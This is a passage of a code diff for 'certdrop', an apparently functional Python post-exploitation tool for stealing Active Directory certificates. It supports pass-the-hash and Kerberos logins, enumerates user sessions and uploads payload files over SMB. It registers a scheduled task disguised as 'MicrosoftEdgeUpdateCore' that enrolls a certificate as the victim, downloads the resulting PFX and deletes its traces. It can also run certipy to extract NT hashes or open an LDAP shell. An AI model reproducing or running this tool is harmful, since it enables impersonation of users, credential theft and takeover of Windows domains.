+        return self.run_cmd(f"powershell -NonInteractive -EncodedCommand {enc}")
+
+    def close(self):
+        pass
+
+
+# ── SMB file transfer ────────────────────────────────────────────────────────
+
+def _parse_unc(drop_dir):
+    parts = drop_dir.replace("\\", "/").split("/", 1)
+    drive = parts[0].rstrip(":") + "$"
+    rest = parts[1].replace("\\", "/") if len(parts) > 1 else ""
+    return drive, rest
+
+
+def smb_connect(ip, hostname, username, password, nt_hash, domain,
+                dc_ip, aes_key, use_krb):
+    remote_name = hostname if use_krb else ip
+    smb = SMBConnection(remote_name, ip)
+    if use_krb:
+        smb.kerberosLogin(username, password or "", domain, "", "",
+                          aes_key or "", kdcHost=dc_ip)
+    elif nt_hash:
+        lm, nt = "", nt_hash
+        if ":" in nt_hash:
+            lm, nt = nt_hash.split(":", 1)
+        smb.login(username, "", domain,
+                  lmhash=lm or "aad3b435b51404eeaad3b435b51404ee", nthash=nt)
     else:
-        pw = password or ""
-        # Note: PTH via pywinrm NTLM is best-effort; use nxc for reliable PTH
-        url = f"http://{ip}:5985/wsman"
-        return winrm.Session(url,
-            auth=(f"{domain}\\{username}", pw),
-            transport="ntlm",
-            read_timeout_sec=30,
-            operation_timeout_sec=29)
+        smb.login(username, password or "", domain)
+    return smb
 
 
-def run_cmd(sess, cmd):
-    """Run a cmd.exe command via WinRM. Returns (stdout_str, stderr_str, rc)."""
-    r = sess.run_cmd(cmd)
-    return r.std_out.decode(errors="replace"), r.std_err.decode(errors="replace"), r.status_code
+def smb_upload(smb, files, drop_dir):
+    share, rel = _parse_unc(drop_dir)
+    for fname, data in files.items():
+        remote = f"{rel}/{fname}" if rel else fname
+        smb.putFile(share, remote, io.BytesIO(data).read)
 
 
-def run_ps(sess, ps):
-    """Run a PowerShell snippet via WinRM."""
-    r = sess.run_ps(ps)
-    return r.std_out.decode(errors="replace"), r.std_err.decode(errors="replace"), r.status_code
+def smb_download(smb, drop_dir, filename, local_path):
+    share, rel = _parse_unc(drop_dir)
+    remote = f"{rel}/{filename}" if rel else filename
+    buf = io.BytesIO()
+    smb.getFile(share, remote, buf.write)
+    with open(local_path, "wb") as fh:
+        fh.write(buf.getvalue())
+    return len(buf.getvalue())
 
 
-# ── Session enumeration ───────────────────────────────────────────────────────
+def smb_read_text(smb, drop_dir, filename):
+    share, rel = _parse_unc(drop_dir)
+    remote = f"{rel}/{filename}" if rel else filename
+    buf = io.BytesIO()
+    try:
+        smb.getFile(share, remote, buf.write)
+        return buf.getvalue().decode(errors="replace").strip()
+    except Exception:
+        return None
 
-def enum_sessions(sess):
-    """Returns list of dicts: {username, session_name, id, state}."""
-    stdout, _, rc = run_cmd(sess, "query session")
+
+def smb_file_exists(smb, drop_dir, filename):
+    share, rel = _parse_unc(drop_dir)
+    remote = f"{rel}/{filename}" if rel else filename
+    try:
+        buf = io.BytesIO()
+        smb.getFile(share, remote, buf.write)
+        return True
+    except Exception:
+        return False
+
+
+def smb_delete_files(smb, drop_dir, prefix):
+    share, rel = _parse_unc(drop_dir)
+    for ext in (".inf", ".bat", ".req", ".cer", ".rsp", ".pfx", ".xml",
+                ".vbs", ".log", ".status"):
+        remote = f"{rel}/{prefix}{ext}" if rel else f"{prefix}{ext}"
+        try:
+            smb.deleteFile(share, remote)
+        except Exception:
+            pass
+
+
+# ── smbclient.py download ───────────────────────────────────────────────────
+
+def smbclient_download(target_ip, username, password, nt_hash, domain,
+                       drop_dir, filename, local_path, use_krb=False,
+                       dc_ip=None, aes_key=None):
+    smbclient = shutil.which("smbclient.py") or shutil.which("impacket-smbclient")
+    if not smbclient:
+        die("smbclient.py / impacket-smbclient not found on PATH")
+
+    share, rel = _parse_unc(drop_dir)
+    remote_file = f"{rel}/{filename}" if rel else filename
+
+    target_str = f"{domain}/{username}"
+    if password:
+        target_str += f":{password}"
+    target_str += f"@{target_ip}"
+
+    args = [smbclient, target_str]
+    if nt_hash:
+        h = nt_hash if ":" in nt_hash else f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
+        args.extend(["-hashes", h])
+    if use_krb:
+        args.append("-k")
+    if dc_ip:
+        args.extend(["-dc-ip", dc_ip])
+
+    cmds = f"use {share}\nlcd {os.path.dirname(os.path.abspath(local_path))}\nget {remote_file}\nexit\n"
+    try:
+        r = subprocess.run(args, input=cmds, capture_output=True, text=True, timeout=60)
+    except subprocess.TimeoutExpired:
+        die("smbclient.py download timed out")
+
+    if not os.path.isfile(local_path):
+        expected = os.path.join(
+            os.path.dirname(os.path.abspath(local_path)),
+            os.path.basename(remote_file)
+        )
+        if os.path.isfile(expected) and expected != local_path:
+            os.rename(expected, local_path)
+        elif not os.path.isfile(local_path):
+            die(f"smbclient.py download failed: {r.stderr.strip()}")
+
+
+# ── CA discovery ─────────────────────────────────────────────────────────────
+
+def discover_ca(domain, dc_ip, username, password, nt_hash):
+    if not HAS_LDAP:
+        return None
+    try:
+        ldap_pass = password or ""
+        if not password and nt_hash:
+            nt = nt_hash.split(":")[-1]
+            ldap_pass = f"aad3b435b51404eeaad3b435b51404ee:{nt}"
+        server = Server(dc_ip, get_info=ALL)
+        conn = Connection(server, user=f"{domain}\\{username}",
+                          password=ldap_pass, authentication=NTLM)
+        if not conn.bind():
+            return None
+        base_dn = ",".join(f"DC={p}" for p in domain.split("."))
+        search_base = (
+            f"CN=Enrollment Services,CN=Public Key Services,"
+            f"CN=Services,CN=Configuration,{base_dn}"
+        )
+        conn.search(search_base, "(objectClass=pKIEnrollmentService)",
+                    attributes=["dNSHostName", "cn"])
+        if conn.entries:
+            e = conn.entries[0]
+            return f"{e.dNSHostName.value}\\{e.cn.value}"
+    except Exception:
+        pass
+    return None
+
+
+# ── Session enumeration ──────────────────────────────────────────────────────
+
+def enum_sessions(transport):
+    stdout, _, _ = _run(transport, "query session")
     sessions = []
     for line in stdout.splitlines()[1:]:
-        m = re.match(r"^\s*(\S+)?\s{2,}(\S+)\s+(\d+)\s+(Active|Disc)\b", line)
+        m = re.match(r"^\s*>?\s*(\S+)?\s{2,}(\S+)\s+(\d+)\s+(Active|Disc)\b", line)
         if m:
+            uname = m.group(2)
+            if uname.lower() in ("services", "65536"):
+                continue
             sessions.append({
                 "session_name": m.group(1) or "",
-                "username":     m.group(2),
+                "username":     uname,
                 "id":           int(m.group(3)),
                 "state":        m.group(4),
             })
@@ -695,7 +947,6 @@ def enum_sessions(sess):
 
 
 def pick_session(sessions):
-    """Interactive numbered picker. Returns chosen session dict."""
     if not sessions:
         die("No active user sessions found on target.")
     print()
@@ -714,284 +965,413 @@ def pick_session(sessions):
         print("  Invalid choice.")
 
 
-# ── CA discovery ──────────────────────────────────────────────────────────────
-
-def discover_ca(domain, dc_ip, username, password, nt_hash):
-    """Query LDAP for pKIEnrollmentService and return CA config string."""
-    if not _HAS_LDAP3:
-        return None
-    try:
-        server = Server(dc_ip, get_info=ALL)
-        conn   = Connection(server, user=f"{domain}\\{username}",
-                            password=password or "", authentication=NTLM)
-        if not conn.bind():
-            return None
-        base_dn     = ",".join(f"DC={p}" for p in domain.split("."))
-        search_base = (
-            f"CN=Enrollment Services,CN=Public Key Services,"
-            f"CN=Services,CN=Configuration,{base_dn}"
-        )
-        conn.search(search_base, "(objectClass=pKIEnrollmentService)",
-                    attributes=["dNSHostName", "cn"])
-        if conn.entries:
-            e = conn.entries[0]
-            return f"{e.dNSHostName.value}\\{e.cn.value}"
-    except Exception:
-        pass
+def find_session_for_user(sessions, target_user):
+    target_lower = target_user.lower()
+    for s in sessions:
+        if s["username"].lower() == target_lower:
+            return s
+    for s in sessions:
+        if target_lower in s["username"].lower():
+            return s
     return None
 
 
-# ── File generation ───────────────────────────────────────────────────────────
+# ── Payload generation ───────────────────────────────────────────────────────
 
 def generate_files(target_user, target_domain, ca_config, template,
-                   prefix, drop_dir, exec_method):
-    """Returns dict of {filename: bytes}."""
-    ca_flag  = f' -config "{ca_config}"' if ca_config else ""
-    profile  = EXEC_METHODS[exec_method]
+                   prefix, drop_dir, exec_wrapper):
+    ca_flag = f' -config "{ca_config}"' if ca_config else ""
+    profile = EXEC_METHODS[exec_wrapper]
     exec_cmd = profile["cmd"]
     exec_arg = profile["args"].format(drop_dir=drop_dir, prefix=prefix)
     end_boundary = (datetime.now() + timedelta(hours=48)).strftime(
         "%Y-%m-%dT%H:%M:%S.000")
 
+    cn = f"{target_user}@{target_domain.lower()}"
+
     files = {}
     files[f"{prefix}.inf"] = CERT_INF.format(
-        cn=f"{target_user}@{target_domain.lower()}", template=template
+        cn=cn, template=template
     ).encode("utf-8")
+
     files[f"{prefix}.bat"] = CERT_BAT.format(
         drop_dir=drop_dir, prefix=prefix, ca_flag=ca_flag
     ).encode("utf-8")
+
     files[f"{prefix}.xml"] = TASK_XML.format(
-        end_boundary=end_boundary, domain=target_domain, username=target_user,
-        exec_cmd=exec_cmd, exec_args=exec_arg,
+        end_boundary=end_boundary, domain=target_domain,
+        username=target_user, exec_cmd=exec_cmd, exec_args=exec_arg,
     ).encode("utf-16")
-    if exec_method == "wscript":
+
+    if exec_wrapper == "wscript":
         files[f"{prefix}.vbs"] = VBS_STUB.format(
             drop_dir=drop_dir, prefix=prefix
         ).encode("utf-8")
+
     return files
 
 
-# ── SMB ───────────────────────────────────────────────────────────────────────
+# ── Task management ──────────────────────────────────────────────────────────
 
-def smb_connect(ip, hostname, username, password, nt_hash, domain, dc_ip, use_krb):
-    remote_name = hostname if use_krb else ip
-    smb = SMBConnection(remote_name, ip)
-    if use_krb:
-        smb.kerberosLogin(username, password or "", domain, "", "", "",
-                          kdcHost=dc_ip)
-    elif nt_hash:
-        lm, nt = ("", nt_hash)
-        if ":" in nt_hash:
-            lm, nt = nt_hash.split(":", 1)
-        smb.login(username, "", domain,
-                  lmhash=lm or "aad3b435b51404eeaad3b435b51404ee", nthash=nt)
-    else:
-        smb.login(username, password, domain)
-    return smb
-
-
-def smb_upload(smb, files, drop_dir):
-    share, rel = _parse_unc(drop_dir)
-    for fname, data in files.items():
-        remote = f"{rel}/{fname}" if rel else fname
-        smb.putFile(share, remote, io.BytesIO(data).read)
-
-
-def smb_download(smb, drop_dir, filename):
-    share, rel = _parse_unc(drop_dir)
-    remote = f"{rel}/{filename}" if rel else filename
-    buf = io.BytesIO()
-    smb.getFile(share, remote, buf.write)
-    return buf.getvalue()
-
-
-def _parse_unc(drop_dir):
-    parts = drop_dir.replace("\\", "/").split("/", 1)
-    drive = parts[0].rstrip(":") + "$"
-    rest  = parts[1].replace("\\", "/") if len(parts) > 1 else ""
-    return drive, rest
-
-
-# ── Task management ───────────────────────────────────────────────────────────
-
-def create_and_run_task(sess, task_name, drop_dir, prefix):
+def create_and_run_task(transport, task_name, drop_dir, prefix):
     xml_path = f"{drop_dir}\\{prefix}.xml"
-    stdout, stderr, rc = run_cmd(sess, f'schtasks /create /xml "{xml_path}" /tn "{task_name}" /f')
+    stdout, stderr, rc = _run(
+        transport, f'schtasks /create /xml "{xml_path}" /tn "{task_name}" /f')
     if rc != 0:
-        die(f"schtasks /create failed (rc={rc}): {stderr.strip() or stdout.strip()}")
+        combined = (stderr.strip() or stdout.strip())
+        die(f"schtasks /create failed (rc={rc}): {combined}")
     info(f"Task '{task_name}' created")
 
-    _, _, rc = run_cmd(sess, f'schtasks /run /tn "{task_name}"')
+    _, _, rc = _run(transport, f'schtasks /run /tn "{task_name}"')
     if rc != 0:
-        warn("schtasks /run failed — task may still fire via RegistrationTrigger")
+        warn("schtasks /run returned non-zero — task may still fire via RegistrationTrigger")
     else:
         info("Task triggered")
 
 
-def poll_for_pfx(sess, drop_dir, prefix, timeout=90):
-    pfx_path = f"{drop_dir}\\{prefix}.pfx"
-    deadline  = time.time() + timeout
+def poll_for_result(transport, smb, drop_dir, prefix, timeout=90,
+                    use_smb_poll=False):
+    pfx_file = f"{prefix}.pfx"
+    status_file = f"{prefix}.status"
+    deadline = time.time() + timeout
+
     while time.time() < deadline:
-        stdout, _, _ = run_ps(sess,
-            f'if (Test-Path "{pfx_path}") {{"yes"}} else {{"no"}}')
-        if stdout.strip().lower() == "yes":
-            print()
-            return True
+        if use_smb_poll:
+            if smb_file_exists(smb, drop_dir, pfx_file):
+                print()
+                return "OK"
+            status = smb_read_text(smb, drop_dir, status_file)
+            if status and status != "OK":
+                print()
+                return status
+        else:
+            out, _, _ = _run_ps(transport,
+                f'if (Test-Path "{drop_dir}\\{pfx_file}") {{"PFX_READY"}} '
+                f'elseif (Test-Path "{drop_dir}\\{status_file}") '
+                f'{{Get-Content "{drop_dir}\\{status_file}"}} '
+                f'else {{"WAITING"}}')
+            result = out.strip()
+            if result == "PFX_READY":
+                print()
+                return "OK"
+            if result.startswith("FAIL_"):
+                print()
+                return result
         print(".", end="", flush=True)
         time.sleep(3)
     print()
-    return False
+    return "TIMEOUT"
 
 
-def cleanup_target(sess, smb, task_name, drop_dir, prefix):
-    run_cmd(sess, f'schtasks /delete /tn "{task_name}" /f')
-    run_cmd(sess, f'cmd /c del "{drop_dir}\\{prefix}.*"')
-    info("Cleaned up task and files")
+def cleanup_remote(transport, smb, task_name, drop_dir, prefix):
+    _run(transport, f'schtasks /delete /tn "{task_name}" /f')
+    smb_delete_files(smb, drop_dir, prefix)
+    info("Cleaned up task and dropped files")
 
 
-# ── Output helpers ────────────────────────────────────────────────────────────
+# ── Certipy auth ─────────────────────────────────────────────────────────────
 
-def info(msg):  print(f"[+] {msg}")
-def warn(msg):  print(f"[!] {msg}", file=sys.stderr)
-def die(msg):   print(f"[-] {msg}", file=sys.stderr); sys.exit(1)
+def run_certipy_auth(pfx_path, dc_ip, domain, username=None,
+                     ldap_shell=False, out_dir="."):
+    certipy = shutil.which("certipy-ad") or shutil.which("certipy")
+    if not certipy:
+        warn("certipy-ad not found on PATH — run manually:")
+        _print_certipy_cmd(pfx_path, dc_ip, domain, username, ldap_shell)
+        return False
+
+    args = [certipy, "auth", "-pfx", pfx_path]
+    if dc_ip:
+        args.extend(["-dc-ip", dc_ip])
+    if domain:
+        args.extend(["-domain", domain])
+    if username:
+        args.extend(["-username", username])
+    if ldap_shell:
+        args.append("-ldap-shell")
+
+    print()
+    info(f"Running: {' '.join(args)}")
+    print()
+    result = subprocess.run(args, cwd=out_dir,
+                            input=b"y\n", timeout=60)
+    return result.returncode == 0
 
 
-# ── Main ──────────────────────────────────────────────────────────────────────
+def _print_certipy_cmd(pfx_path, dc_ip, domain, username, ldap_shell):
+    parts = ["certipy-ad", "auth", "-pfx", pfx_path]
+    if dc_ip:
+        parts.extend(["-dc-ip", dc_ip])
+    if domain:
+        parts.extend(["-domain", domain])
+    if username:
+        parts.extend(["-username", username])
+    if ldap_shell:
+        parts.append("-ldap-shell")
+    print(f"  {' '.join(parts)}")
+
+
+# ── Main ─────────────────────────────────────────────────────────────────────
 
 def main():
-    p = argparse.ArgumentParser(
-        prog="certdrop",
-        description="ADCS cert theft via scheduled task session hijack",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=__doc__,
-    )
-    p.add_argument("target", metavar="TARGET",
-        help="Target host — hostname (preferred) or IP")
-
-    auth = p.add_argument_group("authentication")
-    auth.add_argument("-u", "--username", required=True)
-    auth.add_argument("-p", "--password",  default="",  help="Plaintext password")
-    auth.add_argument("-H", "--hash",      default="",  dest="nt_hash",
-        metavar="[LM:]NT", help="NT hash for pass-the-hash (NTLM only)")
-    auth.add_argument("-d", "--domain",    required=True, help="Domain (e.g. corp.local)")
-    auth.add_argument("-k", "--kerberos",  action="store_true",
-        help="Use Kerberos auth (pure impacket — requires --dc-ip)")
-    auth.add_argument("--dc-ip",           default=None,
-        help="Domain controller IP (for Kerberos KDC and DNS resolution)")
-
-    cert = p.add_argument_group("certificate")
-    cert.add_argument("-ca", default=None,
-        help="CA config string CA_HOST\\CA_NAME (auto-discover if omitted)")
-    cert.add_argument("-t", "--template", default="User",
-        help="Certificate template (default: User)")
-
-    task = p.add_argument_group("task / delivery")
-    task.add_argument("-n", "--task-name", default="MicrosoftEdgeUpdateCore")
-    task.add_argument("--drop-dir",        default=r"C:\Windows\Tasks")
-    task.add_argument("--prefix",          default="cert")
-    task.add_argument("-m", "--exec-method", default="conhost",
-        choices=list(EXEC_METHODS),
-        help="Execution wrapper: conhost|powershell|wscript (default: conhost)")
-
-    p.add_argument("-o", "--out-dir", default="output")
-    p.add_argument("--no-cleanup",    action="store_true")
-    p.add_argument("--timeout",       type=int, default=90)
-
-    args = p.parse_args()
+    args = parse_args()
 
     if args.kerberos and not args.dc_ip:
         die("Kerberos auth requires --dc-ip")
-    if not args.password and not args.nt_hash:
+    if not args.password and not args.nt_hash and not args.aes_key:
         import getpass
         args.password = getpass.getpass(
-            f"Password for {args.domain}\\{args.username}: ")
+            f"  Password for {args.domain}\\{args.username}: ")
 
     print()
+    print("  certdrop v2.0")
+    print()
+
+    # ── Resolve target
     info(f"Resolving target: {args.target}")
     hostname, ip = resolve_target(args.target, args.dc_ip, args.domain)
     info(f"Target: {hostname} ({ip})")
 
-    info("Connecting via WinRM" + (" (Kerberos)" if args.kerberos else " (NTLM)") + "...")
+    # ── Connect transport
+    use_susinternals = (args.exec_method == "susinternals")
+
+    if use_susinternals:
+        info("Connecting via susinternals (PSExeSVC)...")
+        transport = SusinternalsExec(
+            ip, args.username, args.password, args.nt_hash,
+            args.domain, args.dc_ip, args.aes_key, args.kerberos)
+    else:
+        auth_type = "Kerberos" if args.kerberos else "NTLM"
+        info(f"Connecting via WinRM ({auth_type})...")
+        try:
+            transport = connect_winrm(
+                hostname, ip, args.username, args.password, args.nt_hash,
+                args.domain, args.dc_ip, args.aes_key, args.kerberos,
+                args.port)
+            out, _, rc = _run(transport, "echo ok")
+            if rc != 0:
+                die("WinRM connected but probe command failed.")
+        except Exception as e:
+            die(f"WinRM connection failed: {e}")
+    info("Connected")
+
+    # ── SMB connection (always needed for file upload/download)
+    info("Establishing SMB connection...")
     try:
-        sess = winrm_session(hostname, ip, args.username, args.password,
-                             args.nt_hash, args.domain, args.dc_ip, args.kerberos)
-        _, _, rc = run_cmd(sess, "echo ok")
-        if rc != 0:
-            die("WinRM connected but probe failed.")
+        smb = smb_connect(ip, hostname, args.username, args.password,
+                          args.nt_hash, args.domain, args.dc_ip,
+                          args.aes_key, args.kerberos)
     except Exception as e:
-        die(f"WinRM connection failed: {e}")
-    info("WinRM connected")
+        die(f"SMB connection failed: {e}")
+    info("SMB connected")
 
-    info("Enumerating sessions...")
-    sessions = enum_sessions(sess)
-    if not sessions:
-        die("No active user sessions found.")
+    # ── Enumerate sessions
+    if args.target_user:
+        info(f"Using specified target user: {args.target_user}")
+        target_user = args.target_user
+        sessions = enum_sessions(transport)
+        match = find_session_for_user(sessions, target_user)
+        if match:
+            info(f"Found session: {match['username']} "
+                 f"(session {match['id']}, {match['state']})")
+        else:
+            warn(f"No active session found for '{target_user}' — "
+                 f"task will still be created but may not execute until user logs in")
+    else:
+        info("Enumerating sessions...")
+        sessions = enum_sessions(transport)
+        if not sessions:
+            die("No active user sessions found.")
+        target_session = pick_session(sessions)
+        target_user = target_session["username"]
+        info(f"Targeting: {target_user} "
+             f"(session {target_session['id']}, {target_session['state']})")
 
-    target_session = pick_session(sessions)
-    target_user    = target_session["username"]
-    info(f"Targeting: {target_user} (session {target_session['id']}, {target_session['state']})")
-
+    # ── CA discovery
     ca_config = args.ca
     if not ca_config:
         info("Discovering CA via LDAP...")
-        ca_config = discover_ca(args.domain, args.dc_ip or ip,
-                                args.username, args.password, args.nt_hash)
+        ca_config = discover_ca(
+            args.domain, args.dc_ip or ip,
+            args.username, args.password, args.nt_hash)
         if ca_config:
-            info(f"CA found: {ca_config}")
+            info(f"CA: {ca_config}")
         else:
-            warn("CA auto-discovery failed — certreq will use system default")
+            warn("CA auto-discovery failed — certreq will try system default")
 
-    info("Generating payload files...")
+    # ── Generate payload files
+    info(f"Generating payload (template: {args.template})...")
     files = generate_files(
         target_user, args.domain, ca_config, args.template,
-        args.prefix, args.drop_dir, args.exec_method)
+        args.prefix, args.drop_dir, args.exec_wrapper)
     for f in files:
         info(f"  {f}")
 
+    # ── Upload via SMB
     info(f"Uploading to {args.drop_dir}\\ via SMB...")
     try:
-        smb = smb_connect(ip, hostname, args.username, args.password, args.nt_hash,
-                          args.domain, args.dc_ip, args.kerberos)
         smb_upload(smb, files, args.drop_dir)
     except Exception as e:
         die(f"SMB upload failed: {e}")
     info("Upload complete")
 
-    info("Registering scheduled task...")
-    create_and_run_task(sess, args.task_name, args.drop_dir, args.prefix)
+    # ── Register and trigger task
+    info("Creating scheduled task...")
+    create_and_run_task(transport, args.task_name, args.drop_dir, args.prefix)
 
-    info(f"Waiting for PFX (timeout: {args.timeout}s) ...")
-    if not poll_for_pfx(sess, args.drop_dir, args.prefix, args.timeout):
-        warn("Timed out waiting for PFX.")
+    # ── Poll for PFX
+    info(f"Waiting for PFX (timeout: {args.timeout}s)...")
+    result = poll_for_result(
+        transport, smb, args.drop_dir, args.prefix, args.timeout,
+        use_smb_poll=use_susinternals)
+
+    if result != "OK":
+        if result == "TIMEOUT":
+            warn("Timed out waiting for PFX")
+        else:
+            msg = STATUS_MESSAGES.get(result, result)
+            warn(f"Task failed: {msg}")
+        # Try to download the log for diagnostics
+        log_path = os.path.join(args.out_dir, f"{args.prefix}.log")
+        try:
+            os.makedirs(args.out_dir, exist_ok=True)
+            smb_download(smb, args.drop_dir, f"{args.prefix}.log", log_path)
+            warn(f"Diagnostics log saved to {log_path}")
+        except Exception:
+            pass
         if not args.no_cleanup:
-            cleanup_target(sess, smb, args.task_name, args.drop_dir, args.prefix)
-        die("No PFX produced — check CA reachability and template permissions.")
+            cleanup_remote(transport, smb, args.task_name,
+                           args.drop_dir, args.prefix)
+        die("No PFX produced — check CA reachability, template permissions, "
+            "and target user session state.")
 
+    # ── Download PFX
     info("Downloading PFX...")
     os.makedirs(args.out_dir, exist_ok=True)
-    try:
-        pfx_data = smb_download(smb, args.drop_dir, f"{args.prefix}.pfx")
-        out_path  = os.path.join(args.out_dir, f"{args.prefix}.pfx")
-        with open(out_path, "wb") as fh:
-            fh.write(pfx_data)
-        info(f"Saved → {out_path} ({len(pfx_data)} bytes)")
-    except Exception as e:
-        die(f"PFX download failed: {e}")
+    out_path = os.path.join(args.out_dir, f"{args.prefix}.pfx")
 
+    if args.download_method == "smbclient":
+        info("Using smbclient.py for download...")
+        smbclient_download(
+            ip, args.username, args.password, args.nt_hash, args.domain,
+            args.drop_dir, f"{args.prefix}.pfx", out_path,
+            args.kerberos, args.dc_ip, args.aes_key)
+    else:
+        try:
+            size = smb_download(smb, args.drop_dir,
+                                f"{args.prefix}.pfx", out_path)
+            info(f"PFX saved: {out_path} ({size} bytes)")
+        except Exception as e:
+            die(f"PFX download failed: {e}")
+
+    # ── Cleanup
     if not args.no_cleanup:
         info("Cleaning up...")
-        cleanup_target(sess, smb, args.task_name, args.drop_dir, args.prefix)
+        cleanup_remote(transport, smb, args.task_name,
+                       args.drop_dir, args.prefix)
 
-    if isinstance(sess, KerbWinRM):
-        sess.close()
+    # ── Close transport
+    if hasattr(transport, 'close'):
+        transport.close()
 
-    print()
-    print("─" * 60)
-    print("USE PFX")
-    print("─" * 60)
-    dc = args.dc_ip or "<DC_IP>"
-    print(f"  certipy-ad auth -pfx {out_path} -dc-ip {dc} -domain {args.domain}")
-    print()
+    # ── Certipy auth
+    if args.auth or args.ldap_shell:
+        dc = args.dc_ip or ip
+        run_certipy_auth(out_path, dc, args.domain, target_user,
+                         args.ldap_shell, args.out_dir)
+    else:
+        print()
+        print("  " + "─" * 58)
+        print("  PFX ready — authenticate with certipy:")
+        print("  " + "─" * 58)
+        _print_certipy_cmd(out_path, args.dc_ip or "<DC_IP>",
+                           args.domain, target_user, False)
+        print()
+        print("  For LDAP shell:")
+        _print_certipy_cmd(out_path, args.dc_ip or "<DC_IP>",
+                           args.domain, target_user, True)
+        print()
+
+
+# ── Argument parsing ─────────────────────────────────────────────────────────
+
+def parse_args():
+    p = argparse.ArgumentParser(
+        prog="certdrop",
+        description="ADCS cert theft via scheduled task session hijack",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""examples:
+  %(prog)s ECORP-SQL -u admin -p 'Pass123' -d corp.local --dc-ip 10.0.0.1 --auth
+  %(prog)s 10.0.0.5 -u admin -H :abc123def -d corp.local --dc-ip 10.0.0.1 --ldap-shell
+  %(prog)s server01 -u admin -p Pass -d corp.local --dc-ip 10.0.0.1 -k --exec-method susinternals
+  %(prog)s server01 -u admin -p Pass -d corp.local --dc-ip 10.0.0.1 --target-user jsmith --auth
+""",
+    )
+    p.add_argument("target", metavar="TARGET",
+        help="Target host (hostname or IP)")
+
+    auth = p.add_argument_group("authentication")
+    auth.add_argument("-u", "--username", required=True,
+        help="Username for authentication")
+    auth.add_argument("-p", "--password", default="",
+        help="Password (prompted if omitted and no hash/key)")
+    auth.add_argument("-H", "--hashes", default="", dest="nt_hash",
+        metavar="[LM:]NT",
+        help="NT hash for pass-the-hash")
+    auth.add_argument("-d", "--domain", required=True,
+        help="Domain (e.g. corp.local)")
+    auth.add_argument("-k", "--kerberos", action="store_true",
+        help="Use Kerberos authentication (requires --dc-ip)")
+    auth.add_argument("--dc-ip", default=None,
+        help="Domain controller IP")
+    auth.add_argument("--aes-key", default="",
+        help="AES key for Kerberos (128 or 256 bits hex)")
+    auth.add_argument("--port", type=int, default=5985,
+        help="WinRM port (default: 5985)")
+
+    cert = p.add_argument_group("certificate")
+    cert.add_argument("-ca", default=None, metavar="HOST\\NAME",
+        help="CA config string (auto-discover if omitted)")
+    cert.add_argument("-template", default="User",
+        help="Certificate template (default: User)")
+
+    tgt = p.add_argument_group("target selection")
+    tgt.add_argument("--target-user", default=None, metavar="USER",
+        help="Target user directly (skip interactive session picker)")
+
+    exc = p.add_argument_group("execution")
+    exc.add_argument("--exec-method", default="winrm",
+        choices=["winrm", "susinternals"],
+        help="Command execution method (default: winrm)")
+    exc.add_argument("--exec-wrapper", default="conhost",
+        choices=list(EXEC_METHODS),
+        help="Bat execution wrapper: conhost|powershell|wscript (default: conhost)")
+    exc.add_argument("--download-method", default="smb",
+        choices=["smb", "smbclient"],
+        help="PFX download method (default: smb)")
+
+    post = p.add_argument_group("post-exploitation")
+    post.add_argument("--auth", action="store_true",
+        help="Auto-run certipy auth to extract NT hash")
+    post.add_argument("--ldap-shell", action="store_true",
+        help="Open LDAP shell via certipy (implies --auth)")
+
+    task = p.add_argument_group("task options")
+    task.add_argument("-n", "--task-name", default="MicrosoftEdgeUpdateCore",
+        help="Scheduled task name (default: MicrosoftEdgeUpdateCore)")
+    task.add_argument("--drop-dir", default=r"C:\Windows\Tasks",
+        help="Drop directory on target (default: C:\\Windows\\Tasks)")
+    task.add_argument("--prefix", default="cert",
+        help="File prefix (default: cert)")
+
+    out = p.add_argument_group("output")
+    out.add_argument("-o", "--out-dir", default="output",
+        help="Local output directory (default: output)")
+    out.add_argument("--no-cleanup", action="store_true",
+        help="Don't clean up files and task on target")
+    out.add_argument("--timeout", type=int, default=90,
+        help="Seconds to wait for PFX (default: 90)")
+
+    return p.parse_args()
 
 
 if __name__ == "__main__":
